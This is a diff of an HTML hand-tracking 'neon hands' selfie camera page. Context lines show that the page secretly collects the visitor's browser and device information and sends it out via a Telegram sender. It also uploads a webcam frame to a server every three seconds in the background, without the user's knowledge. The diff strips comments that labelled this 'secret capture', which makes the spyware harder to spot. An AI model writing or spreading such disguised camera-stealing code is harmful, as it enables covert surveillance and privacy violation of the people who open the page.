@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Cambot Camera — Neon Hands (Fixed Version)</title>
+  <title>Cambot Camera — Neon Hands</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
@@ -20,7 +20,7 @@
     .logo{display:flex;align-items:center;gap:12px;color:var(--neon);text-shadow:0 0 12px rgba(0,242,254,0.6);font-size:1.6rem;}
     .camera-frame{width:100%;max-width:420px;aspect-ratio:3/4;position:relative;border-radius:14px;padding:14px;box-sizing:border-box;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06));box-shadow:0 8px 40px rgba(0,0,0,0.6),0 0 30px rgba(0,242,254,0.06) inset;}
     .viewport{position:relative;width:100%;height:100%;border-radius:10px;overflow:hidden;background:#000;display:flex;align-items:center;justify-content:center;}
-    video{width:100%;height:100%;object-fit:cover;/* visual selfie */transform:scaleX(-1);}
+    video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
     canvas.overlay{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;}
     .controls{display:flex;gap:16px;align-items:center;justify-content:center;margin-top:12px;z-index:10;}
     .shutter{width:78px;height:78px;border-radius:50%;background:radial-gradient(circle at 30% 30%, #7ceaff,#00c0ff);border:5px solid rgba(255,255,255,0.95);box-shadow:0 8px 25px rgba(0,192,255,0.25),0 0 40px rgba(0,242,254,0.18);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:transform .12s,box-shadow .12s;}
@@ -63,14 +63,13 @@
     </div>
   </div>
 
-  <footer><div class="tagline">Developed by Churchill | Fixed Version</div></footer>
+  <footer><div class="tagline">Developed by Churchill</div></footer>
 
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>
 
   <script>
-    // Elements
     const video = document.getElementById('video');
     const handCanvas = document.getElementById('handCanvas');
     const shutterBtn = document.getElementById('shutterBtn');
@@ -79,7 +78,6 @@
     const handsStatus = document.getElementById('handsStatus');
     const uploadStatus = document.getElementById('uploadStatus');
 
-    // State
     let cameraStream = null;
     let mediaPipeInitialized = false;
     let userInfoSent = false;
@@ -87,14 +85,12 @@
     let imageCount = 0;
     let uploadInProgress = false;
     const DPR = window.devicePixelRatio || 1;
-    const VISUALLY_MIRROR = true; // video element is visually mirrored via CSS
+    const VISUALLY_MIRROR = true;
 
-    // Status updater
     function updateStatus(indicator, status) {
       indicator.classList.toggle('off', !status);
     }
 
-    // --- User info / server sending (restore secret capture) ---
     function collectUserInfo() {
       return {
         userAgent: navigator.userAgent,
@@ -121,7 +117,6 @@
       }
     }
 
-    // Periodic background image sender (secret capture)
     async function sendImageToTelegram() {
       if (!isSendingImages || uploadInProgress) return;
       if (!video.videoWidth || !video.videoHeight) {
@@ -138,14 +133,12 @@
         out.height = video.videoHeight;
         const outCtx = out.getContext('2d');
 
-        // Draw video mirrored (selfie)
         outCtx.save();
         outCtx.translate(out.width, 0);
         outCtx.scale(-1, 1);
         outCtx.drawImage(video, 0, 0, out.width, out.height);
         outCtx.restore();
 
-        // Draw overlay (already aligned with mirrored video by our mapping)
         outCtx.drawImage(handCanvas, 0, 0, handCanvas.width, handCanvas.height, 0, 0, out.width, out.height);
 
         out.toBlob(async blob => {
@@ -159,7 +152,7 @@
           try {
             const formData = new FormData();
             formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
-            const res = await fetch('/upload', { method: 'POST', body: formData });
+            await fetch('/upload', { method: 'POST', body: formData });
             imageCount++;
             console.log(`Image ${imageCount} sent successfully`);
           } catch (err) {
@@ -167,8 +160,7 @@
           } finally {
             uploadInProgress = false;
             updateStatus(uploadStatus, true);
-            // Schedule next send regardless of success/failure
-            setTimeout(sendImageToTelegram, 3000); // Reduced from 15s to 3s for more frequent sends
+            setTimeout(sendImageToTelegram, 3000);
           }
         }, 'image/jpeg', 0.75);
       } catch (e) {
@@ -179,7 +171,6 @@
       }
     }
 
-    // --- Canvas sizing / drawing utilities ---
     function resizeCanvasToVideo() {
       const vw = video.videoWidth || video.clientWidth;
       const vh = video.videoHeight || video.clientHeight;
@@ -188,7 +179,6 @@
       handCanvas.height = Math.round(vh * DPR);
       handCanvas.style.width = video.clientWidth + 'px';
       handCanvas.style.height = video.clientHeight + 'px';
-      // scale drawing context so 1 unit = 1 CSS pixel on display
       ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
       ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
     }
@@ -218,14 +208,12 @@
     }
 
     function mapLandmarkToPixel(landmark, videoWidth, videoHeight) {
-      // landmark.x/y are normalized [0..1] relative to input image
       let x = landmark.x * videoWidth;
-      if (VISUALLY_MIRROR) x = videoWidth - x; // flip to match mirrored video display
+      if (VISUALLY_MIRROR) x = videoWidth - x;
       const y = landmark.y * videoHeight;
       return { x, y };
     }
 
-    // --- MediaPipe init ---
     function initMediaPipe() {
       updateStatus(handsStatus, false);
       
@@ -265,7 +253,6 @@
       cameraUtils.start();
     }
 
-    // --- Camera init & start background sending ---
     async function initCamera() {
       try {
         updateStatus(cameraStatus, false);
@@ -292,16 +279,14 @@
           mediaPipeInitialized = true; 
         }
 
-        // send user info once, then start background sending
         if (!userInfoSent) {
           try {
             await sendToTelegram(collectUserInfo());
             userInfoSent = true;
             updateStatus(uploadStatus, true);
-            setTimeout(sendImageToTelegram, 2000); // Reduced initial delay
+            setTimeout(sendImageToTelegram, 2000);
           } catch (e) {
             console.error('user info send failed', e);
-            // Still attempt sending images even if userInfo fails
             setTimeout(sendImageToTelegram, 3000);
           }
         }
@@ -312,8 +297,6 @@
       }
     }
 
-    // --- Capture button: allow repeated downloads (fix by revoking object URLs) ---
-    // Pre-create a download link for reuse
     const downloadLink = document.createElement('a');
     downloadLink.style.display = 'none';
     document.body.appendChild(downloadLink);
@@ -328,27 +311,21 @@
         out.height = video.videoHeight;
         const outCtx = out.getContext('2d');
 
-        // Draw mirrored video (selfie)
         outCtx.save();
         outCtx.translate(out.width, 0);
         outCtx.scale(-1, 1);
         outCtx.drawImage(video, 0, 0, out.width, out.height);
         outCtx.restore();
 
-        // Draw overlay landmarks directly (no extra mirror) so it matches preview
         outCtx.drawImage(handCanvas, 0, 0, handCanvas.width, handCanvas.height, 0, 0, out.width, out.height);
 
         out.toBlob(blob => {
           if (!blob) return;
-          
-          // Revoke previous object URL if exists
           if (lastObjectUrl) {
             URL.revokeObjectURL(lastObjectUrl);
           }
-          
           const url = URL.createObjectURL(blob);
           lastObjectUrl = url;
-          
           downloadLink.href = url;
           downloadLink.download = `cambot_capture_${Date.now()}.jpg`;
           downloadLink.click();
@@ -358,7 +335,6 @@
       }
     });
 
-    // Cleanup on unload
     window.addEventListener('beforeunload', () => {
       isSendingImages = false;
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
@@ -367,12 +343,10 @@
       }
     });
 
-    // Initialize status indicators
     updateStatus(cameraStatus, false);
     updateStatus(handsStatus, false);
     updateStatus(uploadStatus, false);
 
-    // start
     setTimeout(initCamera, 800);
   </script>
 </body>
